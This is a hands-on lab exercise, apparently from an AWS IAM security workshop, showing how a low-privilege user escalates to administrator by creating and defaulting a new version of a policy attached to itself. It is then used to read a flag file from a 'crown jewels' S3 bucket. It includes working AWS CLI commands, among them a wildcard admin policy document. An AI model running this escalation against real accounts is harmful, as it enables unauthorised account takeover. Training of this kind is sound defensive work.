## Exercise 3: CreatePolicyVersion - Self-Escalation

**Category:** Self-Escalation
**Starting Identity:** `iamws-policy-developer-user`

**The Vulnerability:** The `iamws-policy-developer-user` can create new versions of IAM policies—including a policy that's attached to themselves. By creating a new version with administrator permissions and setting it as default, they escalate their own privileges.

**Real-world scenario:** A developer is given permission to manage "development" policies for their team. Without proper constraints, they can modify ANY policy—including ones attached to their own user, effectively granting themselves any permission they want.

### Visualize in awspx

Open **Advanced Search** in awspx. Set **From** to `iamws-policy-developer-user` and **To** to `Effective Admin`, then click **Run** (▶). You should see a maroon dashed attack edge labeled **`CreatePolicyVersion`** — awspx has identified that this user can modify a policy attached to themselves to reach admin.

> **NOTE**
> Make sure to click **Run** (▶) to run your new query, or you will still see the graph from the previous excercise.

### Part A: Identify with pmapper

First, confirm this user has the dangerous permission:

```bash
pmapper query "can user/iamws-policy-developer-user do iam:CreatePolicyVersion with *"
```

Expected output:
```
user/iamws-policy-developer-user IS authorized to call action
iam:CreatePolicyVersion for resource *
```

**What this means:** The user can create new versions of ANY policy. The `*` wildcard is part of the problem—but even restricting the Resource wouldn't fully fix it if they can still modify policies attached to themselves.

### Part B: Understand the Attack Category

Visit [pathfinding.cloud IAM-001](https://pathfinding.cloud/paths/iam-001) to understand this attack path:

- **Category:** Self-Escalation
- **Required Permission:** `iam:CreatePolicyVersion` (or `iam:SetDefaultPolicyVersion`)
- **Attack:** Create a new policy version with admin permissions, set as default
- **Impact:** Immediate full account access

### Part C: Exploit the Vulnerability

Now let's prove this vulnerability is exploitable.

**Step 1: Verify your attacker identity**
```bash
aws sts get-caller-identity --profile iamws-policy-developer-user
```

You should see you're now operating as `iamws-policy-developer-user`.

**Step 2: Try to access the crown jewels**

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
  --profile iamws-policy-developer-user)

aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-policy-developer-user
```

**Expected:** `AccessDenied` — this developer can't reach the crown jewels... yet.

**Step 3: Identify the policy attached to this user**
```bash
# Store the account ID (already set above)
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
  --profile iamws-policy-developer-user)

# The developer-tools-policy is attached to this user
POLICY_ARN="arn:aws:iam::${ACCOUNT_ID}:policy/iamws-developer-tools-policy"

# View the current policy
aws iam get-policy-version \
  --policy-arn $POLICY_ARN \
  --version-id v1 \
  --query 'PolicyVersion.Document' \
  --output json \
  --profile iamws-policy-developer-user
```

Note the limited permissions (EC2 read-only).

**Step 4: Create a new version of the policy with admin permissions**
```bash
aws iam create-policy-version \
  --policy-arn $POLICY_ARN \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }]
  }' \
  --set-as-default \
  --profile iamws-policy-developer-user
```

**Step 5: Verify the escalation — claim the crown jewels**
```bash
# Now grab the crown jewels
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-policy-developer-user
```

**You just escalated a low-privilege developer to full administrator** by modifying a policy attached to yourself. The crown jewels are yours.

### What You Learned

- **iam:CreatePolicyVersion** allows modifying any policy, including ones attached to self
- The root cause is the ability to modify a policy that grants YOUR OWN permissions

---

**Next:** [Exercise 4: AssumeRole](exercise-4.md) — Principal access via permissive trust policy
